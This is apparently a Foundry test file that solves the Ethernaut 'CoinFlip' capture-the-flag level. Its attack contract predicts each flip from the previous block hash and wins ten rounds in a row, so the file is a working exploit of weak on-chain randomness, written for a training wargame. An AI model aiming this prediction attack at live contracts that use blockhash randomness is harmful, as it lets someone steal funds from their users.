// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
import "../utils.sol";

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
  using SafeMath for uint256;

  ICoinFlip internal coinflipContract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victim) {
    coinflipContract = ICoinFlip(_victim);
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinflip = uint256(uint256(blockValue).div(FACTOR));
    bool side = coinflip == 1 ? true : false;

    coinflipContract.flip(side);
  }
}

contract CoinFlipTest is Test {
  using SafeMath for uint256;

  address internal challengeAddress;
  CoinFlipAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x4dF32584890A0026e56f7535d0f2C6486753624f);
    attackContract = new CoinFlipAttack(challengeAddress);
  }

  function testExploit() public {
    for (uint i = 0; i < 10; i++) {
      attackContract.attack();
      vm.roll(block.number.add(1));
    }

    utils.submitLevelInstance(challengeAddress);
  }
}
